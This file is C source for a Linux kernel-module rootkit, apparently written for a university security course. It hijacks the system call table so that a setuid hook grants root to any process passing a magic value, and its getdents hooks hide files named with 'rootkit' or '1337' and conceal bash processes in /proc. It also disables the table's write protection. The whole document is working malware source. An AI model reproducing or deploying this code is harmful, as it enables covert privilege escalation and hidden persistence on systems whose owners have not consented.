//allows us to perform certain kernel-level operations, such as printk
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
//processes directory
#include <linux/proc_fs.h>
#include <linux/types.h>


struct linux_dirent {
	long           d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};


MODULE_LICENSE("GPL");
MODULE_AUTHOR("1337");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer security course at Stony Brook University. ");

unsigned long * sys_call_table;

asmlinkage int (*real_setuid) (uid_t uid);
asmlinkage int (*real_setuid32) (uid_t uid);
asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*real_getdents64) (unsigned int, struct linux_dirent64*, unsigned int);
asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
extern asmlinkage long hijacked_read(unsigned int, char __user *, size_t);
extern asmlinkage long hijacked_write(unsigned int, char __user *, size_t);


/*
 * Hijacked setuid sets the ids of calling process to root if it
 * knows the secret of rootkit i.e calling process is malicious
 * uid: uid that needs to set or INT_MAX if uid needs to be set to 0
 */
asmlinkage int hijacked_setuid(uid_t uid){
	struct cred *new;
	/*
	 * If uid is INT_MAX, then the ids of the calling process will
	 * be set to root (0)
	 */
	if (uid == INT_MAX){
		new = prepare_creds();
                new->uid = 0;
                new->gid = 0;
                new->suid = 0;
                new->sgid = 0;
                new->euid = 0;
                new->egid = 0;
                new->fsuid = 0;
                new->fsgid = 0;
		/*
		 * Commit the new permission for calling (malicious) process
		 */
		return commit_creds(new);
	}
		/*
		 * By default call the original setuid syscall
		 */
		return real_setuid(uid);
}


int isnumber(char *num){
	int i;
	int b = 1;
	int numlen = strlen(num);
	for(i = 0; i < numlen; i++){
		if(!isdigit(num[i])){
			b = 0;
			break;
		}
	}
	return b;
}

asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

	int num_reads = real_getdents(fd, dirp, count);

	struct linux_dirent *cdirp = dirp, *pdirp = NULL;
	struct file *f = fget(fd), *fcmdline;
	int i, readnums;
	long start_offset = (long)dirp;
	char *kbuf, *kbuf2, *path;
	bool isproc = false;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	kbuf2 = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf2 == NULL) {
		num_reads = -ENOMEM;
		goto free_kbuf;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	if (strcmp(path, "/proc") == 0) {
		isproc = true;
	}
//	printk(KERN_DEBUG "isproc value: %s\n %s\n", isproc? "true" : "false", path);
//	printk(KERN_INFO "hijacked call.\n");
//	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent*)(start_offset + i);
//		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
//		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
		if(isproc && isnumber(cdirp->d_name)){
			strcpy(kbuf, "/proc/");
			strcat(kbuf, cdirp->d_name);
			strcat(kbuf, "/cmdline");
			fcmdline = filp_open(kbuf, O_RDONLY, 0);
			readnums = kernel_read(fcmdline, 0, kbuf2, PAGE_SIZE);
			filp_close(fcmdline, NULL);
//			if (readnums != 0)
//				printk("process cmdline %s\n", kbuf2);
			if (readnums != 0 && strstr(kbuf2, "bash") != NULL) {
//				printk("File to hide %s\n", kbuf2);
				pdirp->d_reclen += cdirp->d_reclen;
			} else {
				pdirp = cdirp;
			}
		} else if (strstr(cdirp->d_name,"rootkit") != NULL){
			if (pdirp == NULL)
				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
			else
				pdirp->d_reclen += cdirp->d_reclen;
		} else {
			pdirp = cdirp;
		}
	}
	kfree(kbuf2);
free_kbuf:
	kfree(kbuf);
out:
	return num_reads;
}

asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){

	int num_reads = real_getdents64(fd, dirp, count);

	struct linux_dirent64 *cdirp = dirp, *pdirp = NULL;

	int i;
	long start_offset = (long)dirp;
	
//	printk(KERN_INFO "hijacked call.\n");
//	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent64*)(start_offset + i);
		
		if (strstr(cdirp->d_name,"1337") != NULL){
			if (pdirp == NULL)
				dirp = (struct linux_dirent64 *)(start_offset + (long)(cdirp->d_reclen));
			else
				pdirp->d_reclen += cdirp->d_reclen;
		} else {
			pdirp = cdirp;
		}
	}

	return num_reads;
}



/* make the address writable if it is write-protected.*/
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}

int make_ro(unsigned long address){
      unsigned int level;
      pte_t *pte = lookup_address(address, &level);
      pte->pte = pte->pte &~ _PAGE_RW;
      return 0;
}



void hijack_sys_call_table(void){
	make_rw((unsigned long)sys_call_table);
    real_getdents = (void*)*(sys_call_table + __NR_getdents);
    real_getdents64 = (void*)*(sys_call_table + __NR_getdents64);
    real_setuid = (void*)*(sys_call_table + __NR_setuid);
    real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
	real_read = (void*)*(sys_call_table + __NR_read);
	real_write = (void*)*(sys_call_table + __NR_write);
	*(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
    *(sys_call_table + __NR_write) = (unsigned long)hijacked_write;
	*(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
	*(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents64;
    *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
    *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
	make_ro((unsigned long)sys_call_table);
}



int init_module(void){
	
	/*
	 * pointer to the system call table. The address is currently hardcoded,
	 * taken from the /boot/System map file. This address seems to be same
	 * after every boot, so for now it can be hardcoded.
	 */

	//Edwin's syscall table address: 
	//sys_call_table = (unsigned long*)0xc1688140;
	
	sys_call_table = (unsigned long*)0xc15c3060;
	hijack_sys_call_table();	
	


	printk(KERN_INFO "Rootkit added.\n\n");


	return 0;
}

void cleanup_module(void){
      	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents64;
        *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
        *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
	*(sys_call_table + __NR_read) = (unsigned long)real_read;
        *(sys_call_table + __NR_write) = (unsigned long)real_write;
	make_ro((unsigned long)sys_call_table);
	printk(KERN_INFO "Rootkit removed.\n");
}
